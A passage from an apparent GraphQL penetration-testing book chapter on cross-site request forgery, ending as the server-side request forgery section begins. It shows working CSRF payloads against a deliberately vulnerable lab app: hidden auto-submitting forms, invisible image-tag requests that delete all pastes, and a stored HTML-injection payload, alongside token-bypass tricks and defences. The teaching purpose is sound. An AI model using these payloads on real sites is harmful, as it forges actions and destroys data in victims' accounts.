<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 9: Request Forgery and Hijacking</title>
<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:c77cce49-9403-4fd1-99ba-33d115574b0c" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter chapter">
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_221" title="221"/><a class="XrefDestination" id="9"/><span class="XrefDestination" id="xref-502840c09-001"/>9</span><br/>
<span class="ChapterTitle"><a class="XrefDestination" id="REQUESTFORGERYANDHIJACKING"/><span class="XrefDestination" id="xref-502840c09-002"/>Request Forgery and Hijacking</span></h1>
</header>
<figure class="opener">
<img alt="" src="image_fi/book_art/chapterart.png"/>
</figure>
<p class="ChapterIntro">When attackers execute hijacking and forgery-based attacks against servers and clients, they can take sensitive actions with potentially devastating outcomes. In this chapter, we’ll test for these vulnerabilities and learn about defenses an application might implement to mitigate these types of flaws.</p>
<p><em>Request forgery</em> occurs when an attacker is able to carry out an action, ideally a sensitive one, on behalf of a client or server. When attackers target clients, they may, for example, try to force the client to transfer money to a digital wallet or bank account that they control. When attackers target servers, they may instead aim to obtain sensitive server-side data, probe for hidden or internal services, make internal requests to restricted networks, access cloud environment–related information, and more. By contrast, <em>hijacking</em> refers to the ability to steal another user’s session.</p>
<p><span epub:type="pagebreak" id="Page_222" title="222"/>In the context of GraphQL, each of these attack vectors poses a threat. We’ll discuss three forms that these attacks can take: cross-site request forgery (CSRF), server-side request forgery (SSRF), and cross-site WebSocket hijacking (CSWSH).</p>
<h2 id="h1-502840c09-0001"><a class="XrefDestination" id="Cross-SiteRequestForgery"/><span class="XrefDestination" id="xref-502840c09-003"/>Cross-Site Request Forgery</h2>
<p class="BodyFirst">Often pronounced <em>sea-surf</em>, <em>CSRF</em> is a client-side attack that causes victims to execute unwanted actions on a website to which they are authenticated. In such an attack, the attacker writes code and embeds it in a website that they operate (or, sometimes, in a third-party site that allows them to do so). They then force the victim to visit that site by leveraging attacks such as social engineering. When the code executes in the victim’s browser, it forges and sends a request to the server.</p>
<p>More often than not, these requests perform state-changing actions. They might update the email or password of an account, transfer money from one account to another, disable account security settings such as multifactor authentication, grant permissions, or even add a new account to an application. <a href="#figure9-1" id="figureanchor9-1">Figure 9-1</a> illustrates the typical CSRF attack flow, using a banking website as an example.</p>
<figure>
<img alt="" class="" src="image_fi/502840c09/F09001.png"/>
<figcaption><p><a id="figure9-1">Figure 9-1</a>: The flow of a CSRF attack</p></figcaption>
</figure>
<p>CSRF takes advantage of the fact that, when a client is logged in to an application, the browser sends necessary information in every HTTP request it makes to the site, such as session cookies (in the <code>Cookie</code> header), and other standard headers like <code>Host</code> or <code>User-Agent</code>. Web servers have no way to distinguish between legitimate requests and those that result from a user <span epub:type="pagebreak" id="Page_223" title="223"/>being tricked, which is why CSRF attacks work well when no mitigations are in place to prevent them.</p>
<p>Attackers use many techniques to achieve CSRF, but one common tactic relies on specially crafted HTML forms, created using <code>&lt;form&gt;</code> tags. The attacker waits for a user to submit a form on their website or, to increase their chances of success, does so automatically using JavaScript code. When a condition allows an attacker to perform a CSRF attack using the GET method, they might also use HTML tags such as <code>&lt;a&gt;</code> and <code>&lt;img&gt;</code> as vectors. These tags, which aren’t usually considered harmful, could provide an attacker with the option to embed CSRF payloads in websites that allow the insertion of image links and hyperlinks. These tags can make only plain GET requests, so if a website has anti-CSRF tokens in place, the attack probably won’t work.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	HTML forms can use only the HTTP methods GET and POST. Other potential state-changing methods, such as DELETE or PUT, are not supported.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>Because a CSRF attack relies on the victim’s authenticated session, the attacker can take only those actions that the victim is allowed to perform on the website. For example, if a victim is logged in to a banking website but can transfer only $1,000 a day, a CSRF attack would be limited to transferring that dollar amount. Additionally, if a particular request requires administrator-level privileges that the client session doesn’t have, the request will fail. <span class="xref" itemid="xref_target_Chapter 7">Chapter 7</span> provides techniques for bypassing certain GraphQL authorization controls.</p>
<p>CSRF is at least two decades old. The first CSRF-related vulnerability with an assigned CVE identifier we could find, CVE-2002-1648, is from 2002, although some people suggest that CSRF vulnerabilities may go back as far as 2001. When it comes to GraphQL, developers may use either queries or mutations to build schemas that support performing sensitive actions (such as changing account settings or transferring money from one account to another). This may allow an attacker to perform state-changing actions. As you’ve learned, state-changing actions are usually done with mutations. However, developers may choose to implement these using queries.</p>
<h3 id="h2-502840c09-0001"><a class="XrefDestination" id="LocatingState-ChangingActions"/><span class="XrefDestination" id="xref-502840c09-004"/>Locating State-Changing Actions</h3>
<p class="BodyFirst">A <em>state-changing action</em> alters the application in some way. For example, changing DVGA’s mode from Beginner to Expert, or vice versa, is considered a state-changing operation. If you’re hunting for CSRF, you should target these actions. As you know by now, state-changing actions in GraphQL are typically performed using mutations. However, you can sometimes perform write operations that are state changing by using GraphQL queries.</p>
<p>Let’s begin with the more likely scenario: identifying state-changing operations based on mutations. To find impactful CSRF vulnerabilities, try extracting the list of available mutations and searching for ones that give you a foothold in the application or allow you to escalate your existing <span epub:type="pagebreak" id="Page_224" title="224"/>privileges. The introspection query shown in <a href="#listing9-1" id="listinganchor9-1">Listing 9-1</a> should return the mutation fields that exist in a schema.</p>
<pre><code><b>query {</b>
<b>  __schema {</b>
<b>    mutationType {</b>
<b>      fields {</b>
<b>        name</b>
<b>      }</b>
<b>    }</b>
<b>  }</b>
<b>}</b></code></pre>
<p class="CodeListingCaption"><a id="listing9-1">Listing 9-1</a>: Introspection query to extract mutation field names</p>
<p>Go ahead and run this query against DVGA by using Altair, ensuring that DVGA’s mode is set to Beginner. You should identify a few state-changing actions, such as <code>createUser</code>, <code>importPaste</code>, <code>editPaste</code>, <code>uploadPaste</code>, <code>deletePaste</code>, and <code>createPaste</code>.</p>
<p>In cases when you don’t notice any sensitive actions, the next thing to look for is whether you can use queries to perform state-changing actions. GraphQL servers sometimes support operations over GET, and when they do, they might intentionally reject GET-based mutations to allow read operations using GET only. This provides a degree of protection against CSRF-like vulnerabilities, as you’ll learn later in this chapter. However, if our target uses any GET-based queries to perform important state changes, that mitigation is useless. Execute the introspection query shown in <a href="#listing9-2" id="listinganchor9-2">Listing 9-2</a> to fetch the names of the available queries.</p>
<pre><code><b>query {</b>
<b> __schema {</b>
<b>  queryType {</b>
<b>    fields {</b>
<b>      name</b>
<b>    }</b>
<b>  }</b>
<b> }</b>
<b>}</b></code></pre>
<p class="CodeListingCaption"><a id="listing9-2">Listing 9-2</a>: Introspection query to extract query field names</p>
<p>Here is an excerpt of the returned list:</p>
<pre><code>{
  "name": "search"
},
{
  "name": "audits"
},
{
  "name": "deleteAllPastes"
}
<var>--snip--</var></code></pre>
<p><span epub:type="pagebreak" id="Page_225" title="225"/>Does any query name stand out? The list has a few potential state-changing queries, but <code>deleteAllPastes</code> is particularly interesting. A query that deletes all pastes would fit better as a mutation than a query. However, because this application is vulnerable, it doesn’t take CSRF issues into consideration.</p>
<h3 id="h2-502840c09-0002"><a class="XrefDestination" id="TestingforPOST-BasedCSRFVulnerabilities"/><span class="XrefDestination" id="xref-502840c09-005"/>Testing for POST-Based Vulnerabilities</h3>
<p class="BodyFirst">Now that we’ve identified a few state-changing queries and mutations, we can attempt to craft an HTML form that exploits them. Our attack might trick a user into clicking a link that redirects them to a malicious website containing a form like the one in <a href="#listing9-3" id="listinganchor9-3">Listing 9-3</a>. When submitted, it will make a POST request to DVGA by using the <code>createPaste</code> mutation.</p>
<pre><code>&lt;html&gt;
  &lt;h1&gt;Click the button below to see the proof of concept!&lt;/h1&gt;
  &lt;body&gt;
     &lt;form id="auto_submit_form" method="POST" action="http://localhost:5013/graphql"&gt;
       &lt;input type="hidden" name="query" value="mutation { createPaste(title:&amp;quot;CSRF&amp;quot;,
content:&amp;quot;content&amp;quot;,
public:true, burn: false) { paste { id content title burn } }}"/&gt;
       &lt;input type="submit" value="Submit"&gt;
     &lt;/form&gt;
  &lt;/body&gt;
&lt;html&gt;</code></pre>
<p class="CodeListingCaption"><a id="listing9-3">Listing 9-3</a>: HTML-form POST-based CSRF exploit</p>
<p>We use the <code>method</code> attribute to define a POST-based form named <code>query</code>. This form will perform the request to the DVGA’s URL, defined in the <code>action</code> attribute. You’ll notice that we also define a hidden <code>&lt;input&gt;</code> tag by setting the <code>type</code> attribute to <code>hidden</code>. This ensures that the form used to execute the query will remain invisible to the victim; it won’t display in their browser. We encode and define the GraphQL mutation in the <code>value</code> attribute. The decoded version of the mutation looks like this:</p>
<pre><code>mutation {
  createPaste(title: "CSRF", content: "content", public: true, burn: false) {
    paste {
      id
      content
      title
      burn
    }
  }
}</code></pre>
<p>To observe how this form would work in an attack, download the CSRF proof-of-concept code from the book’s GitHub repository at <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/post_csrf_submit.html">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/post_csrf_submit.html</a>. Save this file to Kali’s desktop with the extension <em>.html</em>.</p>
<p><span epub:type="pagebreak" id="Page_226" title="226"/>Next, let’s use Burp Suite to view the outbound requests sent in a CSRF attack. Launch Burp Suite and open its built-in browser by clicking <b>Open Browser</b>. Make sure it’s currently set to not intercept requests. Then, drag and drop the HTML file from your desktop into the browser window. You should see the Submit button shown in <a href="#figure9-2" id="figureanchor9-2">Figure 9-2</a>.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c09/F09002.png"/>
<figcaption><p><a id="figure9-2">Figure 9-2</a>: A POST-based CSRF example</p></figcaption>
</figure>
<p>In Burp, toggle the Intercept button to <b>Intercept Is On</b>. Now, click <b>Submit</b> in the form and observe the resulting request in Burp’s Proxy tab. It should look similar to <a href="#figure9-3" id="figureanchor9-3">Figure 9-3</a>.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c09/F09003.png"/>
<figcaption><p><a id="figure9-3">Figure 9-3</a>: The POST request sent from a victim’s browser after a CSRF attack</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_227" title="227"/>As you can see, the mutation is encoded and sent as a single value to the <code>query</code> body parameter. This happens because POST-based HTML forms transform <code>&lt;input&gt;</code> tags into HTTP body parameters, and we used an input tag named <code>query</code>.</p>
<p>Because HTML forms can’t send JSON-formatted data without some help from a language like JavaScript, the submitted mutation isn’t sent as JSON, as indicated by the <code>Content-Type</code> header. Here, it is set to <code>application/x-www-form-urlencoded</code> rather than <code>application/json</code>. Even so, some GraphQL servers may convert the payload back to JSON in the backend, despite lacking the proper <code>Content-Type</code> header.</p>
<p>When an HTML form employs the POST method, we can use one of the following three encoding types to encode the data: <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code>. By default, when the <code>enctype</code> attribute isn’t set, such as in our exploit code, the form uses <code>application/x-www-form-urlencoded</code>, which encodes all characters before sending them to the server. Now that you’ve seen how the CSRF exploit triggered a GraphQL query, click <b>Forward</b> to send it to the server.</p>
<h3 id="h2-502840c09-0003"><a class="XrefDestination" id="AutomaticallySubmittingaCSRFForm"/><span class="XrefDestination" id="xref-502840c09-006"/>Automatically Submitting a CSRF Form</h3>
<p class="BodyFirst">Enticing a user to click a button could introduce challenges. If the user hesitates and doesn’t go through with it, our attack fails. What if we could submit the form automatically, as soon as they visit the page? This is possible to do with JavaScript code. <a href="#listing9-4" id="listinganchor9-4">Listing 9-4</a> executes the form two seconds after someone visits the page.</p>
<pre><code>async function csrf() {
    for (let i = 0; i &lt; 2; i++) {
        await sleep(i * 1000);
    }
    <b>document.forms['auto_submit_for'].submit();</b>
}</code></pre>
<p class="CodeListingCaption"><a id="listing9-4">Listing 9-4</a>: Automatic form submission with JavaScript</p>
<p>The two-second delay is there to give you some time to understand what you are looking at. In real-world scenarios, you’ll want to forge the request on behalf of the victim immediately, without any delay.</p>
<p>To see this attack in action, download the file at <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/post_csrf_submit_auto.html">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/post_csrf_submit_auto.html</a> to Kali’s desktop. Next, toggle on Burp’s intercept mode; then drag and drop the downloaded file into the browser. As soon as you drop it, the message <code>This form is going to submit itself in 2 seconds</code> should appear. Next, you should see the intercepted POST request in Burp. If you click Forward, you should see a response from the GraphQL API in the browser indicating that the mutation resulted in the creation of a new paste, including some metadata, like the paste’s ID, title, and so on.</p>
<p>To verify that the paste creation has indeed worked, open the DVGA user interface at <em>http://localhost:5013</em> and visit the Public Pastes page. You should see the newly created paste shown in <a href="#figure9-4" id="figureanchor9-4">Figure 9-4</a>.</p>
<span epub:type="pagebreak" id="Page_228" title="228"/><figure>
<img alt="" class="keyline" src="image_fi/502840c09/F09004.png"/>
<figcaption><p><a id="figure9-4">Figure 9-4</a>: A paste created via a CSRF attack</p></figcaption>
</figure>
<p>Congratulations! You just simulated forging a paste mutation on behalf of a victim.</p>
<h3 id="h2-502840c09-0004"><a class="XrefDestination" id="TestingforGET-BasedCSRFVulnerabilities"/><span class="XrefDestination" id="xref-502840c09-007"/>Testing for GET-Based Vulnerabilities</h3>
<p class="BodyFirst">Many GraphQL implementations forbid any use of GET, but sending mutations by using the GET method is especially taboo, because it’s considered a security risk that could lead to CSRF vulnerabilities, as you’ve learned. More often than not, GraphQL servers will reject any incoming queries that use a mutation over the GET method. To test whether a GraphQL server supports them, you could send a cURL command like this one:</p>
<pre><code># <b>curl -X GET "http://localhost:5013/graphql?query=mutation%20%7B%20__typename%20%7D"</b></code></pre>
<p>The <code>%20</code> indicates spaces, <code>%7B</code> and <code>%7D</code> are the URL-encoded opening and closing curly brackets (<code>{}</code>) of the mutation query, and the plus sign (<code>+</code>) is an encoded space. When sent to DVGA, the response to this cURL command is as follows:</p>
<pre><code>{"errors":[{"message":"Can only perform a mutation operation from a POST request."}]}</code></pre>
<p>As you can see, DVGA does not allow mutations using the GET method. However, in penetration tests, assume that nothing is off the table and test all hypotheses, because you never know when you will run into a completely custom GraphQL implementation that deviates from the standard.</p>
<p>GET-based CSRF attacks are somewhat more interesting than POST-based ones because applications often won’t implement anti-CSRF protections on GET requests. This is because state-changing actions typically use other HTTP methods. If a server allows mutations over GET, we could exploit the HTML anchor (<code>&lt;a&gt;</code>) tag with the hypertext reference attribute (<code>href</code>) to build a hyperlink that will send the mutation to the server. The anchor tag executes only GET-based requests, which is why it isn’t a great candidate for POST-based CSRF exploitation:</p>
<pre><code>&lt;a href="http://localhost:5013/graphql?query=mutation{someSensitiveAction}" /&gt;</code></pre>
<p><span epub:type="pagebreak" id="Page_229" title="229"/>Alternatively, we could use image tags (<code>&lt;img&gt;</code>) with the source (<code>src</code>) attribute to embed our mutation, like so:</p>
<pre><code>&lt;img src="http://localhost:5013/graphql?query=mutation{someSensitiveAction}" /&gt;</code></pre>
<p>This technique works on any platform that lets you specify innocent-looking HTML tags such as <code>&lt;a&gt;</code> and <code>&lt;img&gt;</code>. Thus, in addition to tricking victims to visit an attacker-controlled website containing these links, you might be able to use them in legitimate websites that accept URLs and render the links on the client side. As a result, clients will make direct GET requests to another site chosen by the attacker.</p>
<p>Although we can’t send mutations to DVGA by using the GET method, we can try using GET to send the state-changing query <code>deleteAllPastes</code>. As the name implies, the <code>deleteAllPastes</code> query will delete all pastes in the server’s database. We can exploit this query by using either GET or POST.</p>
<p>To perform such a CSRF attack, this HTML file uses <code>&lt;form&gt;</code> tags to submit the query. JavaScript code defined using the <code>&lt;script&gt;</code> HTML tags makes the request automatically, as soon as the victim loads the page:</p>
<pre><code>&lt;html&gt;
  &lt;body&gt;
    &lt;h1&gt;This form is going to submit itself in 2 seconds...&lt;/h1&gt;
     &lt;form id="auto_submit_form" <b>method="GET"</b> action="http://localhost:5013/graphql"&gt;
       &lt;input type="hidden" name="query" value="<b>query { deleteAllPastes }</b>"/&gt;
       &lt;input type="submit" value="Submit"&gt;
     &lt;/form&gt;
  &lt;/body&gt;

&lt;script&gt;
function sleep(ms) {
    return new Promise(resolve =&gt; setTimeout(resolve, ms));
}

async function csrf() {
    for (let i = 0; i &lt; 2; i++) {
        await sleep(i * 1000);
    }
    document.forms['auto_submit_form'].submit();
}

csrf();

&lt;/script&gt;
&lt;html&gt;</code></pre>
<p>To test this attack, save the file at <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/get_csrf_submit_auto.html">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/get_csrf_submit_auto.html</a> to your desktop as an HTML file. Make sure Burp Suite is intercepting traffic, and then drag <span epub:type="pagebreak" id="Page_230" title="230"/>and drop the HTML file into your browser window. You should see the outbound HTTP GET request sent after two seconds:</p>
<pre><code>GET /graphql?query=<b>query+%7B+deleteAllPastes+%7D </b>HTTP/1.1
Host: localhost:5013
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
<var>--snip--</var>
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close</code></pre>
<p>We’re able to use CSRF to forge a GET-based query that deletes all pastes. Now let’s try using HTML tags such as <code>&lt;a&gt;</code> and <code>&lt;img&gt;</code> to trigger a GET-based CSRF. One way to do this is to create an HTML page that performs a GET request using an <code>&lt;img&gt;</code> tag, such as the one in <a href="#listing9-5" id="listinganchor9-5">Listing 9-5</a>.</p>
<pre><code>&lt;html&gt;
&lt;body&gt;
  &lt;h1&gt;GET-based CSRF using an image tag&lt;/h1&gt;
  &lt;img src="http://localhost:5013/graphql?query={deleteAllPastes}" style="display: none;" /&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p class="CodeListingCaption"><a id="listing9-5">Listing 9-5</a>: GET-based CSRF using image tags</p>
<p>Save this as an HTML file. As before, it will execute as soon as the page loads, because the browser will try to fetch the URL defined using the <code>src</code> attribute and send a GraphQL query.</p>
<h3 id="h2-502840c09-0005"><a class="XrefDestination" id="PerformingGET-BasedCSRFwithHTMLInjection"/><span class="XrefDestination" id="xref-502840c09-008"/>Using HTML Injection</h3>
<p class="BodyFirst">A second way we could exploit GET-based CSRF is by abusing another vulnerability, such as <em>HTML injection</em>, which allows an attacker to inject HTML tags into a web page. If a victim visits the site, their browser will render the HTML code. In particular, if an attacker is able to inject a hyperlink using the <code>&lt;a&gt;</code> tag or an image link using the <code>&lt;img&gt;</code> tag, clients will initiate the GET request when they visit the page, following the tags’ default behavior.</p>
<p>Can we trigger CSRF on DVGA using HTML injection? Let’s find out. Open Firefox, navigate to <b><i>http://localhost:5013</i></b>, and go to the <b>Public Pastes</b> page. Next, open Developer Tools (CTRL-SHIFT-I) and go to the <b>Network</b> tab. Ensure that Altair is pointing to <em>http://localhost:5013/graphql</em> and enter the mutation in <a href="#listing9-6" id="listinganchor9-6">Listing 9-6</a>, which will create a new paste with a CSRF payload as its content.</p>
<pre><code>mutation {
  createPaste(content:"&lt;img src=\"http://localhost:5013/graphql?query= {
deleteAllPastes }\" &lt;/img&gt;", title:"CSRF using image tags", public: true,
burn: false) {
    paste {
      id
      content
<span epub:type="pagebreak" id="Page_231" title="231"/>    }
  }
}</code></pre>
<p class="CodeListingCaption"><a id="listing9-6">Listing 9-6</a>: Creating a paste containing a CSRF payload</p>
<p>This request injects the <code>&lt;img&gt;</code> tag containing the <code>deleteAllPastes</code> query into the Public Pastes page. To do so, it relies on the fact that DVGA fetches paste data by using GraphQL subscriptions (with WebSocket as the transport protocol). Your browser subscribes to new paste-creation events, so whenever a new paste is created, the subscription automatically populates the page with its title, content, and other information. By putting our payload in the <code>createPaste</code> <code>content</code> field, we effectively embed it on the page.</p>
<p>Now, when clients send queries using <code>createPaste</code> and the <code>content</code> field, they will render the payload. Take a close look at what happens in your Network tab once you send the query. You should see the outbound GET request shown in <a href="#figure9-5" id="figureanchor9-5">Figure 9-5</a>.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c09/F09005.png"/>
<figcaption><p><a id="figure9-5">Figure 9-5</a>: A GET-based query sent through an HTML image tag containing a CSRF payload</p></figcaption>
</figure>
<p>If you refresh your browser, you should no longer see any pastes, as the CSRF attack should have deleted them. Click <b>Rollback DVGA</b>, located in the top-right drop-down menu, to restore the server to its original state.</p>
<p>We’ve discussed GET- and POST-based CSRF attacks. We’ve also discussed how some GraphQL servers attempt to prevent CSRF by rejecting mutations using the GET method, and how to test for those as well. Next, let’s use BatchQL and GraphQL Cop to automatically flag GraphQL servers that might be vulnerable to CSRF.</p>
<h3 id="h2-502840c09-0006"><span epub:type="pagebreak" id="Page_232" title="232"/><a class="XrefDestination" id="AutomatingCSRFTestingwithBatchQLandGraphQLCop"/><span class="XrefDestination" id="xref-502840c09-009"/>Automating Testing with BatchQL and GraphQL Cop</h3>
<p class="BodyFirst">BatchQL has multiple CSRF-related test cases. Let’s run it against DVGA to see what information we’re able to get about its CSRF vulnerabilities:</p>
<pre><code># <b>cd ~/batchql</b>
# <b>python3 batch.py -e http://localhost:5013/graphql | grep -i CSRF</b>

CSRF GET based successful. Please confirm that this is a valid issue.
CSRF POST based successful. Please confirm that this is a valid issue.</code></pre>
<p>As you can see, we used <code>grep</code> with the <code>-i</code> flag to filter out results unrelated to CSRF vulnerabilities. BatchQL detected that both GET and POST allow non-JSON-based queries.</p>
<p>GraphQL Cop is similar to BatchQL in the way it tests for CSRF vulnerabilities, except it additionally tests whether the server supports mutations over GET:</p>
<pre><code># <b>cd ~/graphql-cop</b>
# <b>python3 graphql-cop.py -t http://localhost:5013/graphql | grep -i CSRF</b>

[MEDIUM] GET Method Query Support - GraphQL queries allowed
using the GET method (Possible Cross Site Request Forgery (CSRF))
[MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts
non-JSON queries over POST (Possible Cross Site Request Forgery)</code></pre>
<p>Automated tools may introduce false positives, so we recommend always manually verifying that their results are accurate.</p>
<h3 id="h2-502840c09-0007"><a class="XrefDestination" id="PreventingCSRF"/><span class="XrefDestination" id="xref-502840c09-010"/>Preventing CSRF</h3>
<p class="BodyFirst">In the years since CSRF was discovered, browser vendors such as Mozilla and Google have significantly improved their CSRF mitigations. Various open source web server frameworks have also made CSRF vulnerabilities tremendously harder to exploit. This section explains the CSRF mitigations that exist today at the browser and server levels.</p>
<h4 id="h3-502840c09-0001"><a class="XrefDestination" id="TheSameSiteFlag"/><span class="XrefDestination" id="xref-502840c09-011"/>The SameSite Flag</h4>
<p class="BodyFirst">Browsers have started supporting a special HTTP cookie attribute called <code>SameSite</code>. This attribute allows developers to decide whether the client browser should attach the cookie when making cross-site requests. To set this cookie attribute, the application needs to set a <code>Set-Cookie</code> response header. This interferes with a CSRF attack’s attempt to send a request from the attacker website (say, <em>attacker.com</em>) to a target website of interest (<em>banking.com</em>).</p>
<p>One challenge with using the <code>SameSite</code> attribute is that older browsers may not support it. However, most of the modern browsers do. Mozilla’s Developer website has a dedicated section about <code>SameSite</code> browser support that developers can use as a reference.</p>
<p><span epub:type="pagebreak" id="Page_233" title="233"/>The <code>SameSite</code> cookie attribute accepts three values:</p>
<p class="RunInPara"><span class="RunInHead"><span class="LiteralBold"><code>Strict</code></span></span>  Send the cookie only when the user is browsing within the same origin</p>
<p class="RunInPara"><span class="RunInHead"><span class="LiteralBold"><code>Lax</code></span></span>  Send cookies only when the request uses HTTP GET and was not initiated by a script, such as by top-level navigation</p>
<p class="RunInPara"><span class="RunInHead"><span class="LiteralBold"><code>None</code></span></span>  Send the cookie on cross-site requests, effectively providing no protection</p>
<p>GraphQL servers that set cookies with the <code>SameSite</code> attribute will return a <code>Set-Cookie</code> HTTP response header:</p>
<pre><code>Set-Cookie: session=mysecretsession; SameSite=Strict</code></pre>
<p>When a website sets a cookie without specifying the <code>SameSite</code> attribute, modern browsers such as Chrome assume it is set to <code>Lax</code>. When a cookie is set with a value of <code>Strict</code>, the cookie won’t be sent on cross-site requests if a CSRF attack takes place.</p>
<h4 id="h3-502840c09-0002"><a class="XrefDestination" id="Anti-CSRFTokens"/><span class="XrefDestination" id="xref-502840c09-012"/>Anti-CSRF Tokens</h4>
<p class="BodyFirst">To protect against CSRF vulnerabilities at the server level, web frameworks introduced <em>anti-CSRF tokens</em>. These are hard-to-guess, cryptographically strong, and unique strings generated on the server. The server expects the client to pass an anti-CSRF token on every request. When a server sees an incoming request without such a token, the server rejects that request.</p>
<p>Servers can generate anti-CSRF tokens per request or once for the lifetime of a user session. Generating a token per request is stronger mitigation and more difficult to defeat because it reduces the amount of time an attacker has to obtain a valid token. Once a token gets invalidated, the server should no longer accept it.</p>
<p>Clients typically send anti-CSRF tokens to the server by using an HTTP request header, such as <code>X-CSRF-TOKEN</code>, or in an HTTP body parameter, such as <code>csrf-token</code>. Many web frameworks have built-in support for CSRF protection, allowing developers to build secure applications without requiring them to implement CSRF defenses from scratch. Here is an example HTTP request that contains an anti-CSRF token:</p>
<pre><code>POST /graphql HTTP/1.1
Host: localhost:5013
Content-Length: 19
Content-Type: application/x-www-form-urlencode
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.3

query=mutation+%7B+createPaste%28title%3A%22CSRF%22%2C+content%3A%22content%22
%2C+public%3Atrue%2C+burn%3A+false%29+%7B+paste+%7B+id+content+title+burn+%7D+
%7D%7D&amp;<b>csrf-token=asij2nrsc82kssadis</b></code></pre>
<p><span epub:type="pagebreak" id="Page_234" title="234"/>It’s important to remember that, just like any other security control, tokens can be defeated if implemented incorrectly. Here are a few ways an attacker might go about bypassing anti-CSRF tokens:</p>
<ul class="disc">
<li><b>Removing the CSRF token value. </b>Some anti-CSRF implementations may fail when a CSRF parameter exists but no value is set, resulting in a null value.</li>
<li><b>Removing the CSRF parameter and token value altogether. </b>Some anti-CSRF implementations may fail when the parameter is not set.</li>
<li><b>Reusing a CSRF token in subsequent requests. </b>If an attacker can capture one valid anti-CSRF token, such as one belonging to their own session, and the server doesn’t invalidate already-used tokens, it’s possible to reuse that token in CSRF attacks.</li>
<li><b>Replacing the CSRF token with a random string of the same character length.</b> Some servers may simply look at the token value and check its length. If the length is equal to that of a normal token (for example, 14 characters), they may let the request go through.</li>
<li><b>Brute-forcing the CSRF token.</b> Some CSRF tokens may be cryptographically weak, allowing an attacker to brute-force them. For example, they might be short in length, use a predictable pattern, or employ a weak cryptographic algorithm.</li>
</ul>
<p>When combined, browser- and server-level CSRF protections follow the defense-in-depth security principle and make CSRF harder for attackers to exploit.</p>
<h2 id="h1-502840c09-0002"><a class="XrefDestination" id="Server-SideRequestForgery"/><span class="XrefDestination" id="xref-502840c09-013"/>Server-Side Request Forgery</h2>
<p class="BodyFirst"><em>SSRF</em> allows an attacker to perform requests on behalf of an impacted server. Using SSRF, attackers could force the server to establish connections to internal services, often providing access to restricted network zones, internal APIs, and sensitive data. Web applications can introduce SSRF in many ways. Frequently, applications expose functionality to clients that takes input from them and uses it to perform a particular action. For example, consider an application that lets the user supply a URL to a photo they like from a specific website, such as <em>imgur.com</em>. The application then downloads the photo and sends it to the user over email as an attachment.</p>
<p>In this example, the application expects two inputs: a URL to <em>imgur.com</em> containing an image, and an email address. What if an attacker supplies other inputs, such as a URL like <em>http://lab.blackhatgraphql.com/cat.png</em> and an email address like <em>info@blackhatgraphql.com</em>? If the application doesn’t validate the inputs by, say, ensuring that the URL’s domain is <em>imgur.com</em>, then, once the user submits this information, the application might instead attempt to reach the attacker-controlled website, download the image to disk, and save it to a folder. It might then use a command line utility or a script to send the email with the attachment to the user.</p>
<p><span epub:type="pagebreak" id="Page_235" title="235"/>An attacker could also supply a variety of URLs as input, including URLs that contain addresses of private, non-routable IP addresses (such as <em>172.16.0.0/24</em> or <em>10.10.0.0/24</em>). If the server happens to exist on a network where these ranges exist, it may perform calls to internal services, such as databases or internal websites on the network, allowing an attacker to read responses from servers they shouldn’t otherwise be able to reach. An attacker can also attempt to guess internal URLs in hopes of landing on a valid one that resolves to an internal address (such as <em>internal.example.com</em>, <em>internal2.example.com</em>, and so on).</p>
<p>With the adoption of cloud infrastructure, SSRF has become one of the greatest vulnerabilities for hackers to find. This is because many cloud providers host metadata endpoint URLs, which allow cloud instances to read information about themselves, such as the role assigned to the instance and the credentials in use. Because SSRF could allow an attacker to make internal calls, it could provide them with the ability to obtain this sensitive information about the vulnerable server.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">Note</span></h2>
<p>	Cloud metadata endpoints are outside the scope of this book. You can read more about AWS metadata at <a class="LinkURL" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html">https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html</a> and Google Cloud metadata at <a class="LinkURL" href="https://cloud.google.com/compute/docs/metadata/overview">https://cloud.google.com/compute/docs/metadata/overview</a>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>Attackers can attempt SSRF on a variety of protocols other than HTTP, such as File Transfer Protocol (FTP), Server Message Block (SMB), Lightweight Directory Access Protocol (LDAP), and so on. And, just like other API technologies, GraphQL isn’t immune to SSRF vulnerabilities.</p>
<h3 id="h2-502840c09-0008"><a class="XrefDestination" id="UnderstandingtheTypesofSSRF"/><span class="XrefDestination" id="xref-502840c09-014"/>Understanding the Types of SSRF</h3>
